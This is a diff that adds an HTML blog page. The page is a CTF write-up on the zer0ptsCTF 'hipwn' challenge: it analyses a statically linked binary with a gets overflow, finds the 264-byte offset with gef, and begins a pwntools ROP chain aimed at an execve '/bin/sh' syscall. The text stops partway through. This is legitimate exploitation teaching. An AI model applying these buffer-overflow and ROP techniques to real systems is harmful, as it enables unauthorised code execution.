@@ -1,0 +1,601 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>zer0ptsCTF - Hipwn Challenge &middot; Congo</title>
+    <meta name="title" content="zer0ptsCTF - Hipwn Challenge &middot; Congo" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
+    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        Writeup on how I managed to solve hipwn from zer0ptsCTF.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/zer0pts-hipwn/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/zer0pts-hipwn/">
+  <meta property="og:site_name" content="Congo">
+  <meta property="og:title" content="zer0ptsCTF - Hipwn Challenge">
+  <meta property="og:description" content="Writeup on how I managed to solve hipwn from zer0ptsCTF.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2020-03-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-03-09T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="zer0ptsCTF - Hipwn Challenge">
+<meta name="twitter:description" content="Writeup on how I managed to solve hipwn from zer0ptsCTF.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blogs",
+    "name": "zer0ptsCTF - Hipwn Challenge",
+    "headline": "zer0ptsCTF - Hipwn Challenge",
+    
+    "abstract": "Writeup on how I managed to solve hipwn from zer0ptsCTF.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/zer0pts-hipwn\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2020",
+    "dateCreated": "2020-03-09T00:00:00\u002b00:00",
+    "datePublished": "2020-03-09T00:00:00\u002b00:00",
+    
+    "dateModified": "2020-03-09T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1076"
+  }
+  </script>
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Congo</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href=""
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        zer0ptsCTF - Hipwn Challenge
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2020-03-09 00:00:00 &#43;0000 UTC">9 March 2020</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>Writeup on how I managed to solve <a href="/assets/hipwn">hipwn</a> from <a href="https://www.zer0pts.com" target="_blank" rel="noreferrer">zer0ptsCTF</a>.</p>
+<!-- more -->
+<h1 id="analzying-source-code-and-binary" class="relative group">Analzying Source Code and Binary <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#analzying-source-code-and-binary" aria-label="Anchor">#</a></span></h1><p>So, we got 2 files in a gzip archive, one which is <code>main.c</code> which is the source code of the binary and <code>chall</code> which is the executable we need to pwn. Let&rsquo;s check it out:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;What&#39;s your team name?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">gets</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hi, %s. Welcome to zer0pts CTF 2020!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Looks simple enough, of course we have <code>gets</code> which means we have a buffer overflow vulnerability which seems obvious. Other than that, nothing is really much of a concern.
+Let&rsquo;s run file and check the output:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">robin@oracle:</span><span class="err">~/</span><span class="nf">CTFs$</span> <span class="no">file</span> <span class="no">chall</span>
+</span></span><span class="line"><span class="cl"><span class="nl">chall:</span> <span class="nf">ELF</span> <span class="mi">64</span><span class="p">-</span><span class="no">bit</span> <span class="no">LSB</span> <span class="no">executable</span><span class="p">,</span> <span class="no">x86-64</span><span class="p">,</span> <span class="no">version</span> <span class="mi">1</span> <span class="p">(</span><span class="no">SYSV</span><span class="p">),</span> <span class="no">statically</span> <span class="no">linked</span><span class="p">,</span> <span class="no">stripped</span>
+</span></span></code></pre></div><p>Damn, it is <strong>statically linked</strong> which means that all the libc functions which are used in the binary i.e. <code>puts</code>, <code>printf</code>, <code>gets</code> etc. are embedded in the binary itself and it is stripped which means no debugging symbols. Let&rsquo;s see the binary and run the <code>checksec</code> to see what protections it has:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">robin@oracle:</span><span class="err">~/</span><span class="nf">CTFs$</span> <span class="no">checksec</span> <span class="no">chall</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">chall</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x400000</span><span class="p">)</span>
+</span></span></code></pre></div><p>If it was <strong>dynamically linked</strong> binary we could have done something like leak any GOT address and then calculate the offsets to do something like <code>system(&quot;/bin/sh&quot;)</code>. But since it is <strong>statically linked</strong> it is pointless approach, we gotta use stuffs which are available in binary itself.</p>
+<h1 id="reverse-engineering-the-binary" class="relative group">Reverse Engineering the Binary <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#reverse-engineering-the-binary" aria-label="Anchor">#</a></span></h1><p>Time to reverse enginneer the binary so that we could get the address of some useful functions. Let&rsquo;s check out the main function:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">sub_400160</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-108h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">sub_40062F</span><span class="p">(</span><span class="s">&#34;What&#39;s your team name?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">sub_4004EE</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">sub_400591</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="s">&#34;Hi, %s. Welcome to zer0pts CTF 2020!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>There we go, from source code we know the following things:-</p>
+<ul>
+<li><code>puts(&quot;What's your team name?&quot;)</code> : <code>sub_40062F(&quot;What's your team name?&quot;)</code></li>
+<li><code>gets(name)</code> : <code>sub_4004EE(&amp;v1)</code></li>
+<li><code>printf(&quot;Hi, %s. Welcome to zer0pts CTF 2020!\n&quot;, name)</code>  :<code>sub_400591((unsigned __int64)&quot;Hi, %s. Welcome to zer0pts CTF 2020!\n&quot;)</code></li>
+</ul>
+<p>So, now we know that <code>0x4004EE</code> is the address of the <code>gets</code> and <code>0x40062F</code> is the address of <code>puts</code> and <code>0x400591</code> is the address of the <code>printf</code>, let&rsquo;s keep this thing in mind and time to pwn it.</p>
+<h1 id="pwning-time" class="relative group">Pwning Time <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#pwning-time" aria-label="Anchor">#</a></span></h1><p>So, my initial step was to use any address from <code>bss</code> to store thw address of <code>/bin/sh</code> and after that make a <code>exceve</code> syscall to spawn a shell. I used <code>pwntools</code> to automate most of the parts like getting the <code>bss</code> address and incrementing it by <code>0x200</code> offsets so that the initial address wom&rsquo;t be overwritten as <code>bss</code> loads IO related informations. Let&rsquo;s get it done:-</p>
+<h5 id="finding-offsets" class="relative group">Finding offsets <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#finding-offsets" aria-label="Anchor">#</a></span></h5><p>Finding the offset with <code>gdb-gef</code>&rsquo;s <code>de-brujin</code> based <code>pattern search</code>:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">pattern</span> <span class="no">create</span> <span class="mi">300</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Generating</span> <span class="no">a</span> <span class="no">pattern</span> <span class="no">of</span> <span class="mi">300</span> <span class="no">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="nf">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Saved</span> <span class="no">as</span> <span class="err">&#39;</span><span class="no">$_gef1</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">chall</span> 
+</span></span><span class="line"><span class="cl"><span class="no">What</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">your</span> <span class="no">team</span> <span class="no">name</span><span class="err">?</span>
+</span></span><span class="line"><span class="cl"><span class="nf">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Hi</span><span class="p">,</span> <span class="no">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa.</span> <span class="no">Welcome</span> <span class="no">to</span> <span class="no">zer0pts</span> <span class="no">CTF</span> <span class="mi">2020</span><span class="p">!</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">Program</span> <span class="no">received</span> <span class="no">signal</span> <span class="no">SIGSEGV</span><span class="p">,</span> <span class="no">Segmentation</span> <span class="no">fault.</span>
+</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span> <span class="nf">Modified</span> <span class="no">register</span> <span class="err">|</span> <span class="no">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="err">|</span> <span class="no">String</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">registers</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rax</span>   <span class="p">:</span> <span class="mi">0x0</span>               
+</span></span><span class="line"><span class="cl"><span class="no">$rbx</span>   <span class="p">:</span> <span class="mi">0x6261616161616168</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">haaaaaab</span><span class="err">&#34;?</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rcx</span>   <span class="p">:</span> <span class="mi">0x0</span>               
+</span></span><span class="line"><span class="cl"><span class="no">$rdx</span>   <span class="p">:</span> <span class="mi">0xffffffff</span>        
+</span></span><span class="line"><span class="cl"><span class="no">$rsp</span>   <span class="p">:</span> <span class="mi">0x00007fffffffddf8</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rbp</span>   <span class="p">:</span> <span class="mi">0x00007fffffffde38</span>  <span class="err">→</span>  <span class="mi">0x00007fffffffe1e1</span>  <span class="err">→</span>  <span class="err">&#34;/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">chall</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rsi</span>   <span class="p">:</span> <span class="mi">0x0000000000402efd</span>  <span class="err">→</span>   <span class="no">add</span> <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">],</span> <span class="no">al</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rdi</span>   <span class="p">:</span> <span class="mi">0x0000000000604688</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">Hi</span><span class="p">,</span> <span class="no">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaa</span><span class="p">[...]</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rip</span>   <span class="p">:</span> <span class="mi">0x000000000040019c</span>  <span class="err">→</span>   <span class="no">ret</span> 
+</span></span><span class="line"><span class="cl"><span class="no">$r8</span>    <span class="p">:</span> <span class="mi">0x2000</span>            
+</span></span><span class="line"><span class="cl"><span class="no">$r9</span>    <span class="p">:</span> <span class="mi">0x12c</span>             
+</span></span><span class="line"><span class="cl"><span class="no">$r10</span>   <span class="p">:</span> <span class="mi">0x8080808080808080</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r11</span>   <span class="p">:</span> <span class="mi">0x202</span>             
+</span></span><span class="line"><span class="cl"><span class="no">$r12</span>   <span class="p">:</span> <span class="mi">0x0000000000400160</span>  <span class="err">→</span>   <span class="no">push</span> <span class="no">rbx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r13</span>   <span class="p">:</span> <span class="mi">0x00007fffffffde48</span>  <span class="err">→</span>  <span class="mi">0x00007fffffffe1f8</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">CLUTTER_IM_MODULE</span><span class="err">=</span><span class="no">xim</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r14</span>   <span class="p">:</span> <span class="mi">0x0</span>               
+</span></span><span class="line"><span class="cl"><span class="no">$r15</span>   <span class="p">:</span> <span class="mi">0x0</span>               
+</span></span><span class="line"><span class="cl"><span class="no">$eflags</span><span class="p">:</span> <span class="p">[</span><span class="no">ZERO</span> <span class="no">carry</span> <span class="no">PARITY</span> <span class="no">adjust</span> <span class="no">sign</span> <span class="no">trap</span> <span class="no">INTERRUPT</span> <span class="no">direction</span> <span class="no">overflow</span> <span class="no">RESUME</span> <span class="no">virtualx86</span> <span class="no">identification</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">$cs:</span> <span class="err">0</span><span class="nf">x0033</span> <span class="no">$ss</span><span class="p">:</span> <span class="mi">0x002b</span> <span class="no">$ds</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$es</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$fs</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$gs</span><span class="p">:</span> <span class="mi">0x0000</span> 
+</span></span><span class="line"><span class="cl"><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="no">stack</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffddf8</span><span class="err">│+</span><span class="mi">0x0000</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa</span><span class="err">&#34;</span>	 <span class="err">←</span> <span class="no">$rsp</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffde00</span><span class="err">│+</span><span class="mi">0x0008</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">jaaaaaabkaaaaaablaaaaaabmaaa</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffde08</span><span class="err">│+</span><span class="mi">0x0010</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">kaaaaaablaaaaaabmaaa</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffde10</span><span class="err">│+</span><span class="mi">0x0018</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">laaaaaabmaaa</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffde18</span><span class="err">│+</span><span class="mi">0x0020</span><span class="p">:</span> <span class="mi">0x000000006161616d</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">maaa</span><span class="err">&#34;?</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffde20</span><span class="err">│+</span><span class="mi">0x0028</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffde28</span><span class="err">│+</span><span class="mi">0x0030</span><span class="p">:</span> <span class="mi">0x00000000004001b3</span>  <span class="err">→</span>   <span class="no">lea</span> <span class="no">rdx</span><span class="p">,</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffde30</span><span class="err">│+</span><span class="mi">0x0038</span><span class="p">:</span> <span class="mi">0x0000000000000001</span>
+</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nl">code:x86:</span><span class="err">64</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl">     <span class="err">0</span><span class="nf">x400192</span>                  <span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x100</span>
+</span></span><span class="line"><span class="cl">     <span class="err">0</span><span class="nf">x400199</span>                  <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl">     <span class="err">0</span><span class="nf">x40019b</span>                  <span class="no">pop</span>    <span class="no">rbx</span>
+</span></span><span class="line"><span class="cl"> <span class="err">→</span>   <span class="err">0</span><span class="nf">x40019c</span>                  <span class="no">ret</span>    
+</span></span><span class="line"><span class="cl"><span class="p">[!]</span> <span class="no">Cannot</span> <span class="no">disassemble</span> <span class="no">from</span> <span class="no">$PC</span>
+</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">threads</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] Id 1, Name: &#34;chall&#34;, stopped 0x40019c in ?? (), reason: SIGSEGV
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">trace</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] 0x40019c → ret 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000000000040019c</span> <span class="no">in</span> <span class="err">??</span> <span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">xg</span> <span class="no">$rsp</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x7fffffffddf8:</span>	<span class="err">0</span><span class="nf">x6261616161616169</span>
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">pattern</span> <span class="no">search</span> <span class="mi">0x6261616161616169</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="mi">0x6261616161616169</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Found</span> <span class="no">at</span> <span class="no">offset</span> <span class="mi">264</span> <span class="p">(</span><span class="no">little-endian</span> <span class="no">search</span><span class="p">)</span> <span class="no">likely</span>
+</span></span></code></pre></div><p>Adding it to exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">264</span>
+</span></span></code></pre></div><h5 id="using-gets-to-store-binsh-adddress" class="relative group">Using <code>gets</code> to store /bin/sh adddress <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#using-gets-to-store-binsh-adddress" aria-label="Anchor">#</a></span></h5><p>This one does <code>gets(writeable_addr)</code> as in 64 bit binaries <code>rdi</code> has first arguments.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable_readable_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4004EE</span><span class="p">)</span> <span class="c1"># We know the `gets` address from RE part</span>
+</span></span></code></pre></div><h5 id="doing-a-execve-syscall" class="relative group">Doing a <code>execve</code> syscall <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#doing-a-execve-syscall" aria-label="Anchor">#</a></span></h5><p>Since we have found offsets and chained the rop chain to store <code>/bin/sh</code> in bss address, time to do a <code>execve</code> syscall:-</p>
